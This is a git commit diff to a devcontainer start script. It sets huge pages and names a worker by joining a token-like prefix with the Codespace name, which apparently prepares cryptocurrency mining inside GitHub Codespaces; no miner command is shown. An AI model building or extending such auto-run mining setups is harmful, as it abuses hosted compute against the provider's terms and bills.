db8b4dbd2dbfbaba10777d10f7ebe649b1c244ec
Thai Minh Nguyen <109969513+thaiminh0911@users.noreply.github.com>
2026-05-02 09:25:45 +0700

    Update start.sh

--- .devcontainer/start.sh
+++ .devcontainer/start.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 
-sudo sysctl -w vm.nr_hugepages=4096 || true
+sysctl -w vm.nr_hugepages=4096 2>/dev/null || true
 SHORT_NAME=$(echo "$CODESPACE_NAME" | cut -c1-12)
 WORKER="krxXJZV2MW.$SHORT_NAME"
 echo "Worker name: $WORKER"
